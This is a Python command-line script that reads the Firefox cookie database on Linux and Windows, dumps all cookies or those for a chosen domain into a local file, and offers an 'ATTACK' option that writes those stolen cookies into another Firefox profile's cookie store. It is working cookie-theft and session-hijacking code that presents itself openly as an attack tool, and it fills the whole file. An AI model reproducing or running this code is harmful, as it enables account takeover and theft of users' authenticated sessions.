import sqlite3
import os
from sys import platform

def get_cookies(url):
    if platform == "linux" or platform == "linux2":
        path = "/home/" + os.getlogin() + "/snap/firefox/common/.mozilla/firefox/profiles.ini"
        with open(path,"r") as f:
            with open("cookies","w") as f1:
                for line in f:
                    if "Path=" in line:
                        profile = line[5:]
                        profile = profile.strip()
                        try:
                            con = sqlite3.connect('/home/'+os.getlogin()+'/snap/firefox/common/.mozilla/firefox/'+profile+'/cookies.sqlite')
                            cur = con.cursor()
                            cur.execute("SELECT * FROM moz_cookies")
                            for item in cur.fetchall():
                                if url != "":
                                    for c in item:
                                        if url in str(c):
                                            f1.write(str(list(item)))
                                            f1.write("\n")
                                            break
                                else:
                                    f1.write(str(list(item)))
                                    f1.write("\n")
                        except:
                            print()
                            print("NO TABLE FOUND !")
    elif platform == "win32":
        path = os.path.join(os.path.expandvars("%userprofile%"), "AppData\Roaming\Mozilla\Firefox\Profiles")
        with open("cookies","w") as f1:
            for i in os.listdir(path):
                d = os.path.join(path, i)
                if os.path.isdir(d):
                    try:
                        con = sqlite3.connect(d+'/cookies.sqlite')
                        cur = con.cursor()
                        cur.execute("SELECT * FROM moz_cookies")
                        for item in cur.fetchall():
                            if url != "":
                                for c in item:
                                    if url in str(c):
                                        f1.write(str(list(item)))
                                        f1.write("\n")
                                        break
                            else:
                                f1.write(str(list(item)))
                                f1.write("\n")
                    except:
                        print()
                        print("NO TABLE FOUND !")
def attack():
    if platform == "linux" or platform == "linux2":
        path = "/home/" + os.getlogin() + "/snap/firefox/common/.mozilla/firefox/profiles.ini"
        with open(path,"r") as f:
            for line in f:
                if "Path=" in line:
                    profile = line[5:]
                    profile = profile.strip()
                    try:
                        con = sqlite3.connect('/home/'+os.getlogin()+'/snap/firefox/common/.mozilla/firefox/'+profile+'/cookies.sqlite')
                        cur = con.cursor()
                        with open("cookies","r") as f1:
                            for line in f1:
                                x = line.strip()
                                l = x.strip('][').split(', ')
                                l[0] = int(l[0])
                                l[6] = int(l[6])
                                l[7] = int(l[7])
                                l[8] = int(l[8])
                                l[9] = int(l[9])
                                l[10] = int(l[10])
                                l[11] = int(l[11])
                                l[12] = int(l[12])
                                l[13] = int(l[13])
                                l[14] = int(l[14])
                                for i in range(len(l)):
                                    if "'" in str(l[i]):
                                        l[i] = l[i].replace("'", "")
                                item = tuple(l)
                                cur.execute('INSERT INTO moz_cookies (id, originAttributes, name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly, inBrowserElement, sameSite, rawSameSite, schemeMap) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', item)
                                con.commit()
                            cur.close()
                    except:
                        print()
                        print("NO TABLE FOUND !")
    elif platform == "win32":
        path = os.path.join(os.path.expandvars("%userprofile%"), "AppData\Roaming\Mozilla\Firefox\Profiles")
        for i in os.listdir(path):
            d = os.path.join(path, i)
            if os.path.isdir(d):
                try:
                    con = sqlite3.connect(d+'/cookies.sqlite')
                    cur = con.cursor()
                    with open("cookies","r") as f1:
                        for line in f1:
                            x = line.strip()
                            l = x.strip('][').split(', ')
                            l[0] = int(l[0])
                            l[6] = int(l[6])
                            l[7] = int(l[7])
                            l[8] = int(l[8])
                            l[9] = int(l[9])
                            l[10] = int(l[10])
                            l[11] = int(l[11])
                            l[12] = int(l[12])
                            l[13] = int(l[13])
                            l[14] = int(l[14])
                            for i in range(len(l)):
                                if "'" in str(l[i]):
                                    l[i] = l[i].replace("'", "")
                            item = tuple(l)
                            cur.execute('INSERT INTO moz_cookies (id, originAttributes, name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly, inBrowserElement, sameSite, rawSameSite, schemeMap) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', item)
                            con.commit()
                        cur.close()
                except:
                    print()
                    print("NO TABLE FOUND !")

while True:
    print("1. GET PARTICULAR COOKIES")
    print("2. GET ALL COOKIES")
    print("3. ATTACK")
    print("0. EXIT")
    choice = int(input("ENTER YOUR CHOICE : "))
    if choice == 1:
        url = input("ENTER DOMAIN NAME OR ITS SUBSTRING : ")
        get_cookies(url)
    elif choice == 2:
        get_cookies("")
    elif choice == 3:
        attack()
    elif choice == 0:
        exit(0)
    else:
        print("INVALID CHOICE !")